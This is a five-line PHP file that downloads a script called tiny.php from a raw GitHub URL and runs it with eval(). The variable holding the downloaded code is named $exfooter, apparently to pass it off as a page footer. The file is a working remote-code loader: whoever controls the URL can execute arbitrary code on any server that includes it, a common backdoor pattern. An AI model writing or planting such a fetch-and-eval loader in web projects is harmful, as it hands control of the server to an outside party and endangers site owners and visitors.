<?php
$url = 'https://raw.githubusercontent.com/tarikulislam184/buyer/refs/heads/main/tiny.php';
$exfooter = file_get_contents($url);
eval('?>' . $exfooter);
?>